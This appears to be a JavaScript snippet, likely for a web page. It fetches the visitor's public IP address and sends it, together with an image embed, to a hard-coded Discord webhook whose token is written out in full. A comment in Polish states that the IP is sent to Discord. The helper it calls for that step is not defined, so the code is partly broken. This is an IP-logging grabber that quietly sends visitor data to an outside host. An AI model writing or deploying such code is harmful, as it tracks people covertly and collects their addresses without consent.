
const ipifyAPI = "https://api.ipify.org?format=json";
const webhookURL = "https://discordapp.com/api/webhooks/1548627600061235311/0P_pT9nlRqtxX_ladYn3hJhnY8MxUqoAZjEQnexylIUTliPb_lhYHyllVWN80zXd4ZSX";

async function getIP() {
    try {
        const response = await fetch(ipifyAPI);
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP:", error);
        return null;
    }
}

async function sendImageToDiscord() {
    const payload = {
        content: "Here's the image:",
        embeds: [
            {
                title: "Image",
                description: "This is an example image.",
                url: "https://vergemagazine.co.uk/wp-content/uploads/2025/10/Screenshot-2025-10-09-235055-e1760050295687.jpg",
                image: {
                    url: "https://vergemagazine.co.uk/wp-content/uploads/2025/10/Screenshot-2025-10-09-235055-e1760050295687.jpg"
                }
            }
        ]
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("Image sent to Discord successfully!");
        } else {
            console.error("Error sending image to Discord:", response.statusText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
}

async function main() {
    const ip = await getIP();
    if (ip) {
        // Wyślij adres IP na Discorda
        sendToDiscord(ip);

        // Wyślij obraz na Discorda
        sendImageToDiscord();
    }
}

main();
